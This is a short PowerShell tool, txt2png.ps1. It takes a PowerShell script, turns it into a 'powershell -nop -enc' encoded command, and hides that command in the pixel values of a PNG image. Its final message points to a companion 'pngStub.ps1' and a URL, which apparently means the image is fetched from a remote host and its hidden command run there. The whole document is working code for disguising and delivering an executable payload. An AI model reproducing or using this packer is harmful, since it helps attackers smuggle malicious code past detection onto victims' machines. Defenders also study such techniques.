$scriptPath = Split-Path -Parent $PSCommandPath; $inP = $args[0]; if ($inP -eq $null) { Write-Output "Usage .\txt2png.ps1 powershell_scriptfile_Path <optional_outputpath>";exit; }else{ $rs = Get-Content $inP -raw; $outP = $args[1]; if ($outP -ne $null) { $o = $outP } else { $o = $scriptPath + "\" + $inP + '.png' } $bs = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($rs)); $c = "powershell -nop -enc "; $c += $bs; $l = [int] $($c.Length/4) + 1;$w = [int] [math]::Sqrt($l) + 1; $h = [int] $($l/$w) + 1; $bpp = [System.Drawing.Imaging.PixelFormat]::Format32bppArgb; $bmp = New-Object System.Drawing.Bitmap($w, $h, $bpp); $s = [system.Text.Encoding]::UTF8.GetBytes($c);$ndx=0; for ($i = 0; $i -lt $w; $i++) {for ($j = 0; $j -lt $h; $j++) {$color = [System.Drawing.Color]::FromArgb($s[$ndx++],$s[$ndx++],$s[$ndx++],$s[$ndx++]); $bmp.SetPixel($i, $j, $color); } Write-Output ($c.length,' - ',$ndx,' ','------'); } $bmp.Save($o, [System.Drawing.Imaging.ImageFormat]::Png); Write-Output "Use [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('URL')) to set URL for pngStub.ps1";}